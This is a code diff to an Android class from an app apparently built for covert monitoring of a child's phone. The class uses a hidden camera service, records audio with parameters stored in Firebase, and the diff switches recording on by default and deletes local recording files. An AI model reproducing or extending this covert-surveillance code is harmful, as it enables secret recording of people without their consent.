@@ -7,6 +7,7 @@ import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
 import android.util.Log
+import android.util.Log.i
 import com.github.midros.istheapp.R
 import com.github.midros.istheapp.data.model.ChildPhoto
 import com.github.midros.istheapp.data.model.ChildRecording
@@ -69,7 +70,7 @@ class InteractorAccessibilityData
     InterfaceAccessibility, CameraCallbacks {
 
     private var startTime = (1 * 60 * 1440000).toLong()
-    private var interval = (1 * 1000).toLong()
+    private var interval = (1 * 1000 * 60).toLong()
     private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
     private var disposable: CompositeDisposable = CompositeDisposable()
 
@@ -317,11 +318,12 @@ class InteractorAccessibilityData
 
     private fun setIntervalRecord(interval: Long) {
         //    firebase.getDatabaseReference("$RECORDING/$TIMER/$INTERVAL").setValue(interval)
+        i(TAG, "intervalll $interval")
     }
 
 
     private fun deleteFile() {
-        //      FileHelper.deleteFile(fileName)
+        FileHelper.deleteFile(fileName)
         resetParamsRecording()
     }
 
@@ -351,10 +353,11 @@ class InteractorAccessibilityData
     }
 
     private fun resetParamsRecording() {
-        val childRecording = ChildRecording(false, 0)
+        val childRecording = ChildRecording(true, 1000*60*1)
         firebase.getDatabaseReference("$RECORDING/$PARAMS").setValue(childRecording)
         setIntervalRecord(0)
         nameAudio = ""
+        File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
     }
 
 }
